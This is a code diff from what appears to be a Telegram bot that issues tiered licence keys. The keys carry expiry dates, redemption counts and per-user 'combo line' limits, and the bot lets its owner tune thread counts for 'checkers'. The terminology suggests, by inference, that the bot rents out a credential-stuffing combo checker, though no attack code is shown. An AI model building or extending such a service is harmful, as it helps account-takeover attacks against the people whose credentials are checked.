+# Steps: AWAIT_TIER -> AWAIT_FORMAT -> AWAIT_EXPIRY -> AWAIT_COMBO -> AWAIT_REDEEMS -> AWAIT_LABEL -> AWAIT_COUNT
+_genkey_wizard: dict = {}  # chat_id -> {"step": ..., "tier": str, "format": str, "expiry_days": int, "combo_limit": int, "max_redemptions": int, "label": str}
 
 
 def _parse_duration(arg: str) -> int:
-    """Parse e.g. '1hrs' / '2h' / '30min' / '1d' → seconds. Returns 0 on failure."""
+    """Parse e.g. '1hrs' / '2h' / '30min' / '1d' / '2w' / '3mo' → seconds. Returns 0 on failure."""
     arg = arg.strip().lower()
     import re
-    m = re.match(r"(\d+)\s*(hr?s?|min?s?|d)", arg)
-    if not m:
-        return 0
-    val, unit = int(m.group(1)), m.group(2)
-    if unit.startswith("d"):   return val * 86400
-    if unit.startswith("h"):   return val * 3600
-    if unit.startswith("m"):   return val * 60
-    return 0
+    total = 0
+    for m in re.finditer(r"(\d+)\s*(mo(?:n(?:th)?s?)?|w(?:ee)?k?s?|d(?:ay)?s?|hr?s?|min?s?)", arg):
+        val, unit = int(m.group(1)), m.group(2)
+        if unit.startswith("mo"):  total += val * 86400 * 30
+        elif unit.startswith("w"): total += val * 86400 * 7
+        elif unit.startswith("d"): total += val * 86400
+        elif unit.startswith("h"): total += val * 3600
+        elif unit.startswith("m"): total += val * 60
+    if total == 0:
+        # Try plain number as days
+        m = re.match(r"^(\d+)$", arg)
+        if m:
+            total = int(m.group(1)) * 86400
+    return total
 
 
 def _dur_label(seconds: int) -> str:
@@ -4032,117 +6113,183 @@ def _dur_label(seconds: int) -> str:
     return " ".join(parts) if parts else "0m"
 
 
-# ── /generate_key [duration] ───────────────────────────────────
+# ── /generate_key — matches KeyVault dashboard fields ──────────
 def _handle_gen_key(token: str, chat_id, from_user: dict, args: str):
     if not _is_owner(from_user):
         _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
         return
 
-    args = args.strip()
-
-    if not args:
-        # ── Interactive wizard: ask duration first ─────────────
-        _genkey_wizard[chat_id] = {"step": "AWAIT_DURATION"}
-        _tg_send_buttons(token, chat_id,
-            "🔑 <b>Generate Key — Step 1 of 4</b>\n\n"
-            "⏳ How long should the key be valid?\n\n"
-            "<i>Tap a button or type a custom duration (e.g. <code>3d</code>, <code>12hrs</code>, <code>45min</code>)</i>",
-            [
-                [
-                    {"text": "1 Hour",  "callback_data": "gk_dur:3600"},
-                    {"text": "6 Hours", "callback_data": "gk_dur:21600"},
-                    {"text": "12 Hours","callback_data": "gk_dur:43200"},
-                ],
-                [
-                    {"text": "1 Day",   "callback_data": "gk_dur:86400"},
-                    {"text": "3 Days",  "callback_data": "gk_dur:259200"},
-                    {"text": "7 Days",  "callback_data": "gk_dur:604800"},
-                ],
-                [
-                    {"text": "30 Days", "callback_data": "gk_dur:2592000"},
-                    {"text": "❌ Cancel","callback_data": "gk_cancel"},
-                ],
-            ]
-        )
-        return
-
-    # ── One-shot: /generate_key 1d ─────────────────────────────
-    duration = _parse_duration(args)
-    if duration <= 0:
-        _tg_send(token, chat_id,
-            "❌ <b>Invalid duration.</b>\n\n"
-            "Usage: /generate_key 1d\n"
-            "Examples: 1hrs  30min  7d")
-        return
-
-    # Start from users step (duration already known)
-    _genkey_wizard[chat_id] = {"step": "AWAIT_USERS", "duration": duration}
-    _ask_genkey_users(token, chat_id, duration)
-
-
-def _ask_genkey_users(token: str, chat_id, duration: int):
-    """Ask owner how many users/devices can redeem this key (Step 2 of 4)."""
+    # Start interactive wizard — Step 1: Tier
+    _genkey_wizard[chat_id] = {"step": "AWAIT_TIER"}
     _tg_send_buttons(token, chat_id,
-        f"🔑 <b>Generate Key — Step 2 of 4</b>\n\n"
-        f"⏳ Duration: <b>{_dur_label(duration)}</b>\n\n"
-        f"👥 How many users/devices can use this key?\n\n"
-        f"<i>Tap a button or type a custom number (e.g. <code>50</code>)</i>",
+        "🔑 <b>Generate Key — Step 1 of 6</b>\n\n"
+        "🏷 <b>Select Tier:</b>\n\n"
+        "<i>Free = basic access  |  VIP = premium access + more threads</i>",
         [
             [
-                {"text": "1 user",    "callback_data": "gk_usr:1"},
-                {"text": "5 users",   "callback_data": "gk_usr:5"},
-                {"text": "10 users",  "callback_data": "gk_usr:10"},
+                {"text": "🆓 Free",  "callback_data": "gk_tier:free"},
+                {"text": "⭐ VIP",   "callback_data": "gk_tier:vip"},
             ],
             [
-                {"text": "25 users",  "callback_data": "gk_usr:25"},
-                {"text": "50 users",  "callback_data": "gk_usr:50"},
-                {"text": "100 users", "callback_data": "gk_usr:100"},
-            ],
-            [
-                {"text": "∞ Unlimited users", "callback_data": "gk_usr:0"},
-                {"text": "❌ Cancel",          "callback_data": "gk_cancel"},
+                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
             ],
         ]
     )
 
 
-def _ask_genkey_limit(token: str, chat_id, duration: int, max_users: int):
-    """Ask owner to pick combo line limit for the new key(s) (Step 3 of 4)."""
-    users_disp = "∞ Unlimited" if max_users == 0 else f"{max_users}"
+def _ask_genkey_format(token: str, chat_id):
+    """Step 2: Key format."""
+    wiz = _genkey_wizard.get(chat_id, {})
+    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
     _tg_send_buttons(token, chat_id,
-        f"🔑 <b>Generate Key — Step 3 of 4</b>\n\n"
-        f"⏳ Duration: <b>{_dur_label(duration)}</b>\n"
-        f"👥 Users: <b>{users_disp}</b>\n\n"
-        f"📦 How many combo lines should each user be allowed?\n\n"
-        f"<i>Tap a button or type a custom number (e.g. <code>2000</code>)</i>",
+        f"🔑 <b>Generate Key — Step 2 of 6</b>\n\n"
+        f"🏷 Tier: <b>{tier_disp}</b>\n\n"
+        f"🔤 <b>Select Key Format:</b>\n\n"
+        f"<i>How should the key look?</i>",
         [
             [
-                {"text": "500 lines",  "callback_data": "gk_lim:500"},
-                {"text": "1000 lines", "callback_data": "gk_lim:1000"},
+                {"text": "UUID v4",      "callback_data": "gk_fmt:uuid"},
+                {"text": "HEX-32",       "callback_data": "gk_fmt:hex"},
             ],
             [
-                {"text": "2500 lines", "callback_data": "gk_lim:2500"},
-                {"text": "5000 lines", "callback_data": "gk_lim:5000"},
+                {"text": "ALPHANUM-24",  "callback_data": "gk_fmt:alphanum"},
+                {"text": "PREFIX-KEY",   "callback_data": "gk_fmt:prefix"},
             ],
             [
-                {"text": "∞ Unlimited","callback_data": "gk_lim:0"},
-                {"text": "❌ Cancel",  "callback_data": "gk_cancel"},
+                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
             ],
         ]
     )
 
 
-def _ask_genkey_count(token: str, chat_id, duration: int, max_users: int, combo_limit: int):
-    """Ask owner how many keys to generate (Step 4 of 4)."""
-    limit_disp = "∞ Unlimited" if combo_limit == 0 else f"{combo_limit:,} lines"
-    users_disp = "∞ Unlimited" if max_users == 0 else f"{max_users}"
+def _ask_genkey_expiry(token: str, chat_id):
+    """Step 3: Expiry — same options as KeyVault dashboard."""
+    wiz = _genkey_wizard.get(chat_id, {})
+    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
+    fmt_disp = (wiz.get("format") or "uuid").upper()
     _tg_send_buttons(token, chat_id,
-        f"🔑 <b>Generate Key — Step 4 of 4</b>\n\n"
-        f"⏳ Duration: <b>{_dur_label(duration)}</b>\n"
-        f"👥 Users/key: <b>{users_disp}</b>\n"
-        f"📦 Limit/user: <b>{limit_disp}</b>\n\n"
-        f"🔢 How many keys do you want to generate?\n\n"
-        f"<i>Tap a button or type a custom number (e.g. <code>50</code>)</i>",
+        f"🔑 <b>Generate Key — Step 3 of 6</b>\n\n"
+        f"🏷 Tier: <b>{tier_disp}</b>\n"
+        f"🔤 Format: <b>{fmt_disp}</b>\n\n"
+        f"⏳ <b>Select Expiry:</b>\n\n"
+        f"<i>Pick a preset or type custom (e.g. 1d, 12h, 2w, 3mo):</i>",
+        [
+            [
+                {"text": "1 Hour",   "callback_data": "gk_exp_h:1"},
+                {"text": "6 Hours",  "callback_data": "gk_exp_h:6"},
+                {"text": "12 Hours", "callback_data": "gk_exp_h:12"},
+            ],
+            [
+                {"text": "1 Day",    "callback_data": "gk_exp:1"},
+                {"text": "3 Days",   "callback_data": "gk_exp:3"},
+                {"text": "7 Days",   "callback_data": "gk_exp:7"},
+            ],
+            [
+                {"text": "30 Days",  "callback_data": "gk_exp:30"},
+                {"text": "90 Days",  "callback_data": "gk_exp:90"},
+                {"text": "1 Year",   "callback_data": "gk_exp:365"},
+            ],
+            [
+                {"text": "♾ Never",  "callback_data": "gk_exp:0"},
+            ],
+            [
+                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
+            ],
+        ]
+    )
+
+
+def _wiz_expiry_disp(wiz: dict) -> str:
+    """Display expiry from wizard state."""
+    secs = wiz.get("expiry_seconds", 0)
+    if secs > 0:
+        return _dur_label(secs)
+    days = wiz.get("expiry_days", 0)
+    if days > 0:
+        return f"{days}d"
+    return "Never"
+
+
+def _ask_genkey_combo(token: str, chat_id):
+    """Step 4: Combo Limit — same as KeyVault dashboard."""
+    wiz = _genkey_wizard.get(chat_id, {})
+    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
+    fmt_disp = (wiz.get("format") or "uuid").upper()
+    exp_disp = _wiz_expiry_disp(wiz)
+    _tg_send_buttons(token, chat_id,
+        f"🔑 <b>Generate Key — Step 4 of 6</b>\n\n"
+        f"🏷 Tier: <b>{tier_disp}</b>\n"
+        f"🔤 Format: <b>{fmt_disp}</b>\n"
+        f"⏳ Expiry: <b>{exp_disp}</b>\n\n"
+        f"📦 <b>Select Combo Limit:</b>\n\n"
+        f"<i>Pick a preset or type a custom number:</i>",
+        [
+            [
+                {"text": "500 lines",    "callback_data": "gk_lim:500"},
+                {"text": "1,000 lines",  "callback_data": "gk_lim:1000"},
+                {"text": "2,500 lines",  "callback_data": "gk_lim:2500"},
+            ],
+            [
+                {"text": "5,000 lines",  "callback_data": "gk_lim:5000"},
+                {"text": "10,000 lines", "callback_data": "gk_lim:10000"},
+                {"text": "∞ Unlimited",  "callback_data": "gk_lim:0"},
+            ],
+            [
+                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
+            ],
+        ]
+    )
+
+
+def _ask_genkey_redeems(token: str, chat_id):
+    """Step 5: Max Redemptions — same as KeyVault dashboard."""
+    wiz = _genkey_wizard.get(chat_id, {})
+    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
+    fmt_disp = (wiz.get("format") or "uuid").upper()
+    exp_disp = _wiz_expiry_disp(wiz)
+    combo_disp = "∞ Unlimited" if wiz.get("combo_limit") == 0 else f"{wiz.get('combo_limit', 1000):,} lines"
+    _tg_send_buttons(token, chat_id,
+        f"🔑 <b>Generate Key — Step 5 of 6</b>\n\n"
+        f"🏷 Tier: <b>{tier_disp}</b>\n"
+        f"🔤 Format: <b>{fmt_disp}</b>\n"
+        f"⏳ Expiry: <b>{exp_disp}</b>\n"
+        f"📦 Combo: <b>{combo_disp}</b>\n\n"
+        f"👥 <b>Max Redemptions:</b>\n\n"
+        f"<i>Pick a preset or type a custom number:</i>",
+        [
+            [
+                {"text": "1",    "callback_data": "gk_usr:1"},
+                {"text": "5",    "callback_data": "gk_usr:5"},
+                {"text": "10",   "callback_data": "gk_usr:10"},
+            ],
+            [
+                {"text": "50",   "callback_data": "gk_usr:50"},
+                {"text": "100",  "callback_data": "gk_usr:100"},
+                {"text": "∞",    "callback_data": "gk_usr:0"},
+            ],
+            [
+                {"text": "❌ Cancel", "callback_data": "gk_cancel"},
+            ],
+        ]
+    )
+
+
+def _ask_genkey_count(token: str, chat_id):
+    """Step 6: How many keys to generate."""
+    wiz = _genkey_wizard.get(chat_id, {})
+    tier_disp = "⭐ VIP" if wiz.get("tier") == "vip" else "🆓 Free"
+    fmt_disp = (wiz.get("format") or "uuid").upper()
+    exp_disp = _wiz_expiry_disp(wiz)
+    combo_disp = "∞ Unlimited" if wiz.get("combo_limit") == 0 else f"{wiz.get('combo_limit', 1000):,} lines"
+    redeems_disp = "∞ Unlimited" if wiz.get("max_redemptions") == 0 else f"{wiz.get('max_redemptions', 1)}"
+    _tg_send_buttons(token, chat_id,
+        f"🔑 <b>Generate Key — Step 6 of 6</b>\n\n"
+        f"🏷 Tier: <b>{tier_disp}</b>\n"
+        f"🔤 Format: <b>{fmt_disp}</b>\n"
+        f"⏳ Expiry: <b>{exp_disp}</b>\n"
+        f"📦 Combo: <b>{combo_disp}</b>\n"
+        f"👥 Redeems: <b>{redeems_disp}</b>\n\n"
+        f"🔢 <b>How many keys to generate?</b>",
         [
             [
                 {"text": "1 key",    "callback_data": "gk_cnt:1"},
@@ -4161,42 +6308,94 @@ def _ask_genkey_count(token: str, chat_id, duration: int, max_users: int, combo_
     )
 
 
-def _finalize_gen_key(token: str, chat_id, duration: int, combo_limit: int, count: int = 1, max_users: int = 1):
-    """Actually create `count` keys, each allowing up to `max_users` users."""
+def _finalize_gen_key(token: str, chat_id, tier: str, key_format: str,
+                      expiry_days: int, combo_limit: int, max_redemptions: int,
+                      count: int = 1, label: str = "", expiry_seconds: int = 0):
+    """Create `count` keys matching KeyVault dashboard fields.
+    Tries KeyVault API first; falls back to local JSON storage.
+    expiry_seconds takes priority over expiry_days for sub-day precision.
+    """
     now     = time.time()
-    expires = now + duration
+    duration = expiry_seconds if expiry_seconds > 0 else (expiry_days * 86400 if expiry_days > 0 else 0)
+    expires = (now + duration) if duration > 0 else (now + 86400 * 36500)  # ~100 years for "Never"
     keys    = _load_keys()
 
     new_keys = []
-    for _ in range(count):
-        k = _gen_key()
-        keys[k] = {
-            "expires":     expires,
-            "combo_limit": combo_limit,
-            "max_users":   max_users,   # 0 = unlimited
-            "used_by":     [],          # list of chat_ids that redeemed
-            "created":     now,
-        }
-        new_keys.append(k)
+    api = _get_keysystem_api()
+
+    # Try KeyVault API first
+    api_keys = []
+    if api.enabled:
+        api_keys = api.generate_key(
+            duration_seconds=duration if duration > 0 else 86400 * 365,
+            max_users=max_redemptions,
+            combo_limit=combo_limit,
+            count=count,
+            tier=tier,
+            key_format=key_format,
+            label=label,
+        )
+
+    if api_keys:
+        for api_key_data in api_keys:
+            k = api_key_data.get("key", _gen_key())
+            keys[k] = {
+                "expires":         expires,
+                "combo_limit":     combo_limit,
+                "max_users":       max_redemptions,
+                "used_by":         [],
+                "created":         now,
+                "api_id":          api_key_data.get("id", ""),
+                "source":          "keyvault",
+                "tier":            tier,
+                "format":          key_format,
+                "label":           label or api_key_data.get("label", ""),
+                "redemption_count": 0,
+            }
+            new_keys.append(k)
+    else:
+        for _ in range(count):
+            k = _gen_local_key(key_format, tier)
+            keys[k] = {
+                "expires":         expires,
+                "combo_limit":     combo_limit,
+                "max_users":       max_redemptions,
+                "used_by":         [],
+                "created":         now,
+                "source":          "local",
+                "tier":            tier,
+                "format":          key_format,
+                "label":           label,
+                "redemption_count": 0,
+            }
+            new_keys.append(k)
 
     _save_keys(keys)
     _genkey_wizard.pop(chat_id, None)
 
-    limit_disp = "∞ Unlimited" if combo_limit == 0 else f"{combo_limit:,} lines"
-    users_disp = "∞ Unlimited" if max_users  == 0 else f"{max_users}"
-    exp_dt     = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M")
+    # Display fields matching KeyVault dashboard
+    tier_disp    = "⭐ VIP" if tier == "vip" else "🆓 Free"
+    fmt_disp     = key_format.upper()
+    combo_disp   = "∞ Unlimited" if combo_limit == 0 else f"{combo_limit:,} lines"
+    redeems_disp = "∞ Unlimited" if max_redemptions == 0 else f"{max_redemptions}"
+    exp_disp     = "Never" if duration == 0 else _dur_label(duration)
+    exp_dt       = "Never" if duration == 0 else datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M")
+    label_disp   = label if label else "(none)"
 
     if count == 1:
         _tg_send(token, chat_id,
             f"✅ <b>Key Generated Successfully!</b>\n\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🔑 <b>Key:</b>\n<code>{new_keys[0]}</code>\n\n"
-            f"⏳ <b>Duration:</b> {_dur_label(duration)}\n"
+            f"🏷 <b>Tier:</b> {tier_disp}\n"
+            f"🔤 <b>Format:</b> {fmt_disp}\n"
+            f"📝 <b>Label:</b> {label_disp}\n"
+            f"⏳ <b>Expiry:</b> {exp_disp}\n"
             f"📅 <b>Expires:</b> {exp_dt}\n"
-            f"👥 <b>Users/devices:</b> {users_disp}\n"
-            f"📦 <b>Combo limit/user:</b> {limit_disp}\n"
+            f"📦 <b>Combo Limit:</b> {combo_disp}\n"
+            f"👥 <b>Max Redemptions:</b> {redeems_disp}\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"<i>Share this key — up to {users_disp} users can redeem it.</i>"
+            f"<i>Share this key — up to {redeems_disp} users can redeem it.</i>"
         )
     else:
         import io
@@ -4208,10 +6407,12 @@ def _finalize_gen_key(token: str, chat_id, duration: int, combo_limit: int, coun
         _tg_send(token, chat_id,
             f"✅ <b>{count} Keys Generated!</b>\n\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⏳ <b>Duration:</b> {_dur_label(duration)}\n"
+            f"🏷 <b>Tier:</b> {tier_disp}\n"
+            f"🔤 <b>Format:</b> {fmt_disp}\n"
+            f"⏳ <b>Expiry:</b> {exp_disp}\n"
             f"📅 <b>Expires:</b> {exp_dt}\n"
-            f"👥 <b>Users/devices per key:</b> {users_disp}\n"
-            f"📦 <b>Combo limit/user:</b> {limit_disp}\n"
+            f"📦 <b>Combo Limit:</b> {combo_disp}\n"
+            f"👥 <b>Max Redemptions:</b> {redeems_disp}\n"
             f"🔢 <b>Total keys:</b> {count}\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
             f"<i>Keys attached below as .txt file.</i>"
@@ -4222,7 +6423,7 @@ def _finalize_gen_key(token: str, chat_id, duration: int, combo_limit: int, coun
                 url,
                 data={
                     "chat_id":    chat_id,
-                    "caption":    f"🔑 <b>{count} keys</b> · {_dur_label(duration)} · {users_disp} users · {limit_disp}",
+                    "caption":    f"🔑 <b>{count} keys</b> · {tier_disp} · {exp_disp} · {combo_disp} · {redeems_disp} redeems",
                     "parse_mode": "HTML",
                 },
                 files={"document": (fname, io.BytesIO(txt_bytes), "text/plain")},
@@ -4280,8 +6481,152 @@ def _handle_server_status(token: str, chat_id, from_user: dict):
         f"⚙️ <b>Limits</b>\n"
         f"  Max concurrent users: <b>{MAX_CONCURRENT_USERS}</b>\n"
         f"  Threads per user: <b>{MAX_THREADS_PER_USER}</b>\n"
-        f"  Total thread cap: <b>{MAX_GLOBAL_THREADS}</b>"
+        f"  VIP threads per user: <b>{VIP_THREADS_PER_USER}</b>\n"
+        f"  Total thread cap: <b>{MAX_GLOBAL_THREADS}</b>\n\n"
+        f"💡 Use /setthreads to change thread counts\n"
+        f"Use /setmaxusers to change max concurrent users"
     )
+
+
+# ── /setthreads — owner command to change thread counts ────────
+def _handle_set_threads(token: str, chat_id, from_user: dict, args: str):
+    """
+    /setthreads              — show current settings
+    /setthreads <N>          — set Free threads per user
+    /setthreads free <N>     — set Free threads per user
+    /setthreads vip <N>      — set VIP threads per user
+    /setthreads global <N>   — set global thread cap
+    """
+    global FREE_THREADS_PER_USER, MAX_THREADS_PER_USER, VIP_THREADS_PER_USER, MAX_GLOBAL_THREADS, _global_thread_sem
+
+    if not _is_owner(from_user):
+        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+        return
+
+    parts = args.strip().lower().split() if args.strip() else []
+
+    # No args — show current settings
+    if not parts:
+        _tg_send(token, chat_id,
+            f"🧵 <b>Thread Settings</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"  🆓 Free: <b>{FREE_THREADS_PER_USER}</b> threads/user (queued)\n"
+            f"  ⭐ VIP: <b>{VIP_THREADS_PER_USER}</b> threads/user (no queue)\n"
+            f"  🌐 Global cap: <b>{MAX_GLOBAL_THREADS}</b> threads\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"<b>Usage:</b>\n"
+            f"  <code>/setthreads 5</code> — set Free to 5\n"
+            f"  <code>/setthreads free 5</code> — set Free to 5\n"
+            f"  <code>/setthreads vip 10</code> — set VIP to 10\n"
+            f"  <code>/setthreads global 40</code> — set global cap to 40")
+        return
+
+    # Parse: /setthreads <N> or /setthreads <type> <N>
+    try:
+        if len(parts) == 1:
+            # /setthreads <N> — set Free threads
+            new_val = int(parts[0])
+            if new_val < 1 or new_val > 50:
+                _tg_send(token, chat_id, "❌ Thread count must be between <code>1</code> and <code>50</code>.")
+                return
+            old_val = FREE_THREADS_PER_USER
+            FREE_THREADS_PER_USER = new_val
+            MAX_THREADS_PER_USER = new_val  # keep alias in sync
+            _tg_send(token, chat_id,
+                f"✅ <b>Free threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
+                f"<i>Takes effect for new checkers. Running checkers keep their current threads.</i>")
+
+        elif len(parts) == 2:
+            target = parts[0]
+            new_val = int(parts[1])
+
+            if target == "free":
+                if new_val < 1 or new_val > 50:
+                    _tg_send(token, chat_id, "❌ Free thread count must be between <code>1</code> and <code>50</code>.")
+                    return
+                old_val = FREE_THREADS_PER_USER
+                FREE_THREADS_PER_USER = new_val
+                MAX_THREADS_PER_USER = new_val  # keep alias in sync
+                _tg_send(token, chat_id,
+                    f"✅ <b>Free threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
+                    f"<i>Takes effect for new checkers.</i>")
+
+            elif target == "vip":
+                if new_val < 1 or new_val > 50:
+                    _tg_send(token, chat_id, "❌ VIP thread count must be between <code>1</code> and <code>50</code>.")
+                    return
+                old_val = VIP_THREADS_PER_USER
+                VIP_THREADS_PER_USER = new_val
+                _tg_send(token, chat_id,
+                    f"✅ <b>VIP threads per user:</b> {old_val} → <b>{new_val}</b>\n\n"
+                    f"<i>Takes effect for new checkers.</i>")
+
+            elif target == "global":
+                if new_val < 1 or new_val > 100:
+                    _tg_send(token, chat_id, "❌ Global cap must be between <code>1</code> and <code>100</code>.")
+                    return
+                old_val = MAX_GLOBAL_THREADS
+                MAX_GLOBAL_THREADS = new_val
+                _global_thread_sem = threading.Semaphore(new_val)
+                _tg_send(token, chat_id,
+                    f"✅ <b>Global thread cap:</b> {old_val} → <b>{new_val}</b>\n\n"
+                    f"⚠️ <i>New semaphore created. Running checkers still use old slots.</i>")
+
+            else:
+                _tg_send(token, chat_id,
+                    f"❌ Unknown target: <code>{target}</code>\n"
+                    f"Use: <code>/setthreads [free|vip|global] &lt;number&gt;</code>")
+        else:
+            _tg_send(token, chat_id,
+                f"❌ Too many arguments.\n"
+                f"Use: <code>/setthreads &lt;number&gt;</code> or <code>/setthreads [free|vip|global] &lt;number&gt;</code>")
+
+    except ValueError:
+        _tg_send(token, chat_id, "❌ Invalid number. Use: <code>/setthreads 10</code>")
+
+
+# ── /setmaxusers — owner command to change max concurrent users ──────────────────────
+def _handle_set_max_users(token: str, chat_id, from_user: dict, args: str):
+    """
+    /setmaxusers           — show current max concurrent users
+    /setmaxusers <N>       — set max concurrent users to N
+    """
+    global MAX_CONCURRENT_USERS
+
+    if not _is_owner(from_user):
+        _tg_send(token, chat_id, "🚫 <b>Owner only command.</b>")
+        return
+
+    parts = args.strip().split() if args.strip() else []
+
+    running_now = sum(1 for s in _bot_state.values() if s == "RUNNING")
+
+    # No args — show current setting
+    if not parts:
+        _tg_send(token, chat_id,
+            f"👥 <b>Max Concurrent Users</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"  Current limit: <b>{MAX_CONCURRENT_USERS}</b>\n"
+            f"  Running now: <b>{running_now}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"<b>Usage:</b>\n"
+            f"  <code>/setmaxusers 20</code> — set max to 20")
+        return
+
+    # Parse: /setmaxusers <N>
+    try:
+        new_val = int(parts[0])
+        if new_val < 1 or new_val > 100:
+            _tg_send(token, chat_id, "❌ Max concurrent users must be between <code>1</code> and <code>100</code>.")
+            return
+        old_val = MAX_CONCURRENT_USERS
+        MAX_CONCURRENT_USERS = new_val
+        _tg_send(token, chat_id,
+            f"✅ <b>Max concurrent users:</b> {old_val} → <b>{new_val}</b>\n\n"
+            f"<i>Currently running: {running_now} user(s). "
+            f"New limit takes effect immediately for new checkers.</i>")
+    except ValueError:
+        _tg_send(token, chat_id, "❌ Invalid number. Use: <code>/setmaxusers 20</code>")
 
 
 # ── /statuskey ─────────────────────────────────────────────────
@@ -4291,6 +6636,36 @@ def _handle_status_key(token: str, chat_id, from_user: dict, args: str):
         return
 
     keys = _load_keys()
+    api = _get_keysystem_api()
+
+    # Sync keys from KeyVault API if enabled
+    if api.enabled:
+        api_keys = api.list_keys()
+        now = time.time()
+        for ak in api_keys:
+            key_value = ak.get("key", "")
+            if key_value and key_value not in keys:
+                expires_at = ak.get("expiresAt")
+                expires = (expires_at / 1000.0) if expires_at else (now + 86400 * 365)
+                rate_limit = ak.get("rateLimit", "1000")
+                combo_limit = int(rate_limit) if str(rate_limit).isdigit() else 0
+                max_redemptions = ak.get("maxRedemptions")
+                keys[key_value] = {
+                    "expires":         expires,
+                    "combo_limit":     combo_limit,
+                    "max_users":       max_redemptions if max_redemptions else 0,
+                    "used_by":         [],
+                    "created":         ak.get("createdAt", now * 1000) / 1000.0,
+                    "api_id":          ak.get("id", ""),
+                    "source":          "keyvault",
+                    "revoked":         ak.get("revoked", False),
+                    "tier":            ak.get("tier", "free"),
+                    "format":          ak.get("format", "unknown"),
+                    "label":           ak.get("label", ""),
+                    "redemption_count": ak.get("redemptionCount", 0),
+                }
+        _save_keys(keys)
+
     if not keys:
         _tg_send(token, chat_id, "📭 <b>No keys found.</b>\nGenerate one with /generate_key")
         return
@@ -4305,48 +6680,115 @@ def _handle_status_key(token: str, chat_id, from_user: dict, args: str):
             return
         e = keys[target]
         expired   = now > e.get("expires", 0)
+        revoked   = e.get("revoked", False)
         remaining = max(0, int(e.get("expires", 0) - now))
-        status    = "❌ Expired" if expired else f"✅ Active — {_dur_label(remaining)} left"
-        # Handle both legacy (string) and new (list) used_by
+        if revoked:
+            status = "🚫 Revoked"
+        elif expired:
+            status = "❌ Expired"
+        else:
+            status = f"✅ Active — {_dur_label(remaining)} left"
         used_by   = e.get("used_by", [])
         if isinstance(used_by, str):
             used_by = [used_by] if used_by else []
+        # Enrich legacy string entries with name/username from saved profiles
+        enriched = []
+        for u in used_by:
+            if isinstance(u, str):
+                profile = _get_saved_profile(u)
+                name = ""
+                username = ""
+                if profile:
+                    name = profile.get("username", "")
+                    username = profile.get("username", "")
+                enriched.append({"id": u, "name": name, "username": username, "tg_id": u})
+            else:
+                enriched.append(u)
+        used_by = enriched
         max_users  = e.get("max_users", 1)
         slots_used = len(used_by)
         slots_max  = "∞" if max_users == 0 else str(max_users)
-        limit_disp = "∞ Unlimited" if e.get("combo_limit") == 0 else f"{e.get('combo_limit', 500):,}"
+        combo_disp = "∞ Unlimited" if e.get("combo_limit") == 0 else f"{e.get('combo_limit', 500):,} lines"
         created    = datetime.fromtimestamp(e.get("created", 0)).strftime("%Y-%m-%d %H:%M")
         exp_dt     = datetime.fromtimestamp(e.get("expires", 0)).strftime("%Y-%m-%d %H:%M")
-        users_list = "\n".join(f"    • <code>{u}</code>" for u in used_by) or "    <i>none yet</i>"
+        tier_disp  = "⭐ VIP" if e.get("tier") == "vip" else "🆓 Free"
+        label_disp = e.get("label") or "(none)"
+        fmt_disp   = (e.get("format") or "unknown").upper()
+        source     = e.get("source", "local")
+        # Build rich user list with Name, @username, ID, and active status
+        users_lines = []
+        for u in used_by:
+            if isinstance(u, dict):
+                u_name = u.get("name", "")
+                u_user = u.get("username", "")
+                u_id   = u.get("id", u.get("tg_id", ""))
+                # Check if this user is currently active
+                u_chat_id = None
+                try: u_chat_id = int(u_id)
+                except (ValueError, TypeError): pass
+                is_active = False
+                if u_chat_id and u_chat_id in _bot_state:
+                    is_active = _bot_state[u_chat_id] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
+                active_badge = "🟢 1/1" if is_active else "⚫ 0/1"
+                # key-username format
+                username_part = f"@{u_user}" if u_user else u_name or str(u_id)
+                display = f"    • <code>{target[:8]}-{username_part}</code>"
+                display += f" ─ {u_name}"
+                if u_user:
+                    display += f" @{u_user}"
+                display += f" ─ <code>{u_id}</code> {active_badge}"
+                users_lines.append(display)
+            else:
+                # Legacy: plain chat_id string
+                u_chat_id = None
+                try: u_chat_id = int(u)
+                except (ValueError, TypeError): pass
+                is_active = False
+                if u_chat_id and u_chat_id in _bot_state:
+                    is_active = _bot_state[u_chat_id] in ("RUNNING", "AWAIT_FILE", "AWAIT_LEVEL", "AWAIT_FILTER")
+                active_badge = "🟢 1/1" if is_active else "⚫ 0/1"
+                profile = _get_saved_profile(u)
+                p_name = profile.get("username", "") if profile else ""
+                username_part = f"@{p_name}" if p_name else str(u)
+                display = f"    • <code>{target[:8]}-{username_part}</code>"
+                display += f" ─ <code>{u}</code> {active_badge}"
+                users_lines.append(display)
+        users_list = "\n".join(users_lines) or "    <i>none yet</i>"
         _tg_send(token, chat_id,
             f"🔍 <b>Key Details</b>\n\n"
             f"🔑 <code>{target}</code>\n\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             f"📊 <b>Status:</b> {status}\n"
+            f"🏷 <b>Tier:</b> {tier_disp}\n"
+            f"🔤 <b>Format:</b> {fmt_disp}\n"
+            f"📝 <b>Label:</b> {label_disp}\n"
